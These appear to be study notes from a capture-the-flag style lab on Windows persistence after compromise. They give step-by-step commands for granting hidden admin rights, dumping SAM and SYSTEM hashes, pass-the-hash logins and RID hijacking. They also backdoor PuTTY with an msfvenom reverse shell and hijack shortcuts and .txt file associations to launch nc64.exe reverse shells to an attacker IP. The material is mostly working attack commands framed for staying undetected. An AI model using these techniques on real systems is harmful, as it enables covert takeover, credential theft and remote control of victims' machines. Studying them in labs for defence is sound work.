- Refers to creating alternate ways to regain access to a host after gaining administrative access without going through the exploitation phase all over again.
- Many reasons to quickly establish persistence
	- Re-exploitation isn't always possible due to unstable exploits.
	- Gaining foothold is hard to reproduce, like phishing campaigns.
	- Any vulnerabilities used to gain access might be patched if action is detected.
- ## *Tampering with Unprivileged Users*
	- Manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrator privileges somehow.
	- #### *Assign Group Memberships*
		- Assuming that the password hashes for unprivileged users were already dumped and successfully cracked any of them.
		- Using `net localgroup administrators thmuser0 /add` to add the user `thmuser0` to the administrators group.
		- If this looks too suspicious, use the group `Backup Operators`, users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL.
			- Allowing us to copy the content of the SAM and SYSTEM registry hives, which can be used to recover the password hashes for all users, enabling us to escalate to any administrative account easily.
			- Using `net localgroup "Backup Operators" thmuser1 /add` and since this unprivileged user can't RDP or WinRM back to the machine, add it to the `Remote Desktop Users` (RDP) or `Remote Management Users` (WinRM) groups `net localgroup "Remote Management Users" thmuser1 /add`.
			- Check for the group assigned using `whoami /groups` and make sure that the groups aren't disabled. This is due to the `User Account Control` which implements a feature called `LocalAccountTokenFilterPolicy` that strips any local account of its administrative privileges when logging in remotely.
			- Disable the `LocalAccountTokenFilterPolicy` by changing the the registry key to 1 `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`.
			- After that, establish a WinRM connection using `evil-winrm -i <ip> -u <user> -p <password>`.
			- Check for the assigned groups using `whoami /groups`.
			- Backup the SAM and SYSTEM files using `reg save hklm\sam sam.bak` and `reg save hklm\system system.bak` then download them to the attacking machine using `download system.bak` and `download sam.bak`.
			- In case WinRM takes a lot of time to download the files, try other file transfer methods.
			- Dump the passwords using `python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL`.
			- After getting the hash, perform a Pass-the-Hash to connect to the victim `evil-winrm -i <ip> -u Administrator -H <hash>`.
	- #### *Special Privileges and Security Descriptors*
		- A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership.
		- Special groups are only special because the operation system assigns them specific privileges by default.
		- In the case of Backup Operators, they have `SeBackupPrivilege` and `SeRestorePrivilege` by default.
		- These privileges can be assigned to any user
			- First export the current configuration to a temp file `secedit /export /cfg config.inf`.
			- Open the file and add a user to the lines in the configuration regarding the `SeBackupPrivilege` and `SeRestorePrivilege`.
			- Convert the .inf file into a .sdb file which is used to load the configuration back into the system `secedit /import /cfg config.inf /db config.sdb` then `secedit /configure /db config.sdb /cfg config.inf`.
			- Now, we should have a user with equivalent privileges to any Backup Operator, but the user still cant login to the system using WinRM.
			- Instead of adding the user to the `Remote Management Users` group, change the security descriptor associated with the WinRM service to allow the user to connect.
			- Security Descriptors are like ACLs but applied to other system facilities.
			- Open the configuration window for WinRM's security descriptor using `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI` in PowerShell, this will open a window where we can add a user and assign full privileges to connect to WinRM.
			- After that connect with WinRM and recover the password hashes from the SAM and SYSTEM and connect back with the Administrator user.
			- Use `evil-winrm -i <ip> -u Administrator -H <hash>` to connect with Administrator user.
			- For the user to work with the given privileges fully, change the `LocalAccountTokenFilterPolicy` registry key using  `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`.
			- Check user's groups using `net user thmuser2`, since we didn't add the user to any group, nothing is suspicious.
			- Assuming that the credentials of the user are dumped, connect using WinRM.
	- #### *RID Hijacking* 
		- Changing some registry values to make the operating system think you are the Administrator.
		- When a user is created, an identifier called Relative ID (RID) is assigned to them. The RID is a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID.
		- If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.
		- By default, the Administrator account is assigned `RID 500`and a regular user is assigned `RID >= 1000`.
		- Find assigned RIDs using `wmic useraccount get name,sid`, the RID is the last bit of the SID.
		- Access the SAM using Regedit to assign the Administrator RID to an unprivileged user. The SAM is restricted to the SYSTEM account only, even the Administrator won't be able to edit it.
		- To run Regedit as SYSTEM, use psexec `Psexec64.exe -i -s regedit`.
		- Go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user, using the found RID of the unprivileged user (converting it to hex), there will be a value called `F` which holds the user's RID at position `0x30`.
		- The RID is stored using little-endian notation, so its bytes appear reversed.
		- Replace those two bytes with the RID of Administrator in hex `500 = 0x01F4` switching the bytes around to `F401`.
		- The next time this user logs in, LSASS will associate it with the same RID as Administrator.
- ## *Backdooring Files*
	- Tampering with files that the user interacts with regularly to plant backdoors that will get executed whenever the user accesses them, and to keep a low profile and not alert the user, the file should keep working normally.
	- #### *Executable Files*
		- In case of an executable found laying around in the desktop, there is a high chance that the user use it frequently.
		- For example, found a shortcut to PuTTY lying around, if we check the properties, it usually points to `C:\Program Files\PuTTY\putty.exe`.
		- Download the executable from the target machine and modify it to  run any payload we want.
		- Using `msfvenom` to plant any payload into a .exe file, the binary will still work as usual but executes an additional payload silently by adding an extra thread in your binary `msfvenom -a x64 --platform windows -x putty.exe -k -p windows\x64\shell_reverse_tcp lhost=<attack-ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`.
	- #### *Shortcut Files*
		- In case we don't want to alter an executable, we can alter the shortcut itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.
		- For example, altering the shortcut `calc`, right-click and select properties, look at the `Target` field pointing to the `calc.exe` file.
			- Before hijacking the target, create a simple PowerShell script in `C:\Windows\System32` or any other sneaky location.
			- The script will execute a reverse shell and run `calc.exe` from the original location on the shortcut's properties.
			- The script contains
				`Start-Process -NoNewWindow "C:\tools\nc64.exe" "-e cmd.exe <attack-ip> 4445`
				`C:\Windows\System32\calc.exe`
			- Then change the shortcut's target to point to the script created above.
			- Sometimes the shortcut's icon changes, point the icon back to the original executable.
			- The shortcut's target should contain `powershell.exe -WindowStyle hidden c:\Windows\System32\backdoor.ps1`.
			- Open a netcat listener to catch the reverse shell.
	- #### *Hijacking File Associations*
		- This forces the operating system to run a shell whenever the user opens a specific file type.
		- The default operating system file associations are kept inside the registry, where a key is stored for every file type under `HKLM\Software\Classes\`.
		- The Programmatic ID (ProgID) is an identifier to a program installed on the system that's in charge of handling the associated file which is at the (Default) row and Data column, in case of `.txt` files, its `txtfile`.
		- Searching for the subkey for the corresponding ProgID also under `HKLM\Software\Classes`, for this example, `HKLM\Software\Classes\txtfile\shell\open\command`.
		- Replace the command in Data column to with a script that executes a backdoor and then opens the file as usual.
		- Create the script and save it to `C:\Windows\backdoor2.ps1`, the script should contain
			`Start-Process -NoNewWindow "c:\tools\nc64.exe "-e cmd.exe <attacker-ip> 4448"`
			`C:\Windows\System32\NOTEPAD.EXE $args[0]`
		- Set the Data column should contain `powershell -windowstyle hidden C:\Windows\System32\backdoor2.ps1 %1`.
		- Create a listener to catch the reverse shell.